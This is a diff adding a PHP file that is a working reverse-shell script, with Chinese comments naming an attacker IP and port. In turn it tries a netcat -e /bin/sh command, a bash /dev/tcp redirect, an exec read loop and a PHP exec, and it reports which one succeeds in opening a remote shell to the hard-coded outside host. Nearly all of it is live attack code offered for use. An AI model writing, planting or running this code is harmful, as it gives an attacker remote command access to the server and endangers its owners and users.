@@ -1,0 +1,55 @@
+<?php
+
+$attacker_ip = '107.189.29.12';  // 攻击者 IP
+$attacker_port = 58888;          // 攻击者端口
+
+// 定义反弹命令
+$cmd_nc = "nc -e /bin/sh $attacker_ip $attacker_port";  // Netcat 反弹（Linux）
+$cmd_bash = "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1";  // Bash 反弹（Linux）
+$cmd_exec = "exec 5<>/dev/tcp/$attacker_ip/$attacker_port; cat <&5 | while read line; do $line 2>&5 >&5; done"; // 使用 exec 反弹（Linux）
+$cmd_php_socket = "php -r 'exec(\"/bin/sh -i <&3 >&3 2>&3\");'";  // PHP socket 反弹
+
+// 标记是否成功反弹
+$rebound_success = false;
+
+function try_rebound($cmd) {
+    global $rebound_success;
+    if ($rebound_success) {
+        return;  // 如果已经反弹成功，停止执行
+    }
+
+    // 尝试执行反弹命令
+    exec($cmd, $output, $status);
+
+    if ($status === 0) {
+        $rebound_success = true;  // 标记反弹成功
+        echo "Rebound successful with command: $cmd\n";
+    } else {
+        echo "Failed to rebound with command: $cmd\n";
+    }
+}
+
+// 尝试使用 Netcat 反弹
+try_rebound($cmd_nc);
+
+// 如果 Netcat 失败，再尝试使用 Bash 反弹
+if (!$rebound_success) {
+    try_rebound($cmd_bash);
+}
+
+// 如果 Bash 也失败，再尝试使用 exec 反弹
+if (!$rebound_success) {
+    try_rebound($cmd_exec);
+}
+
+// 如果 exec 也失败，再尝试使用 PHP socket 反弹
+if (!$rebound_success) {
+    try_rebound($cmd_php_socket);
+}
+
+// 如果四种方式都失败
+if (!$rebound_success) {
+    echo "All rebound attempts failed.\n";
+}
+
+?>
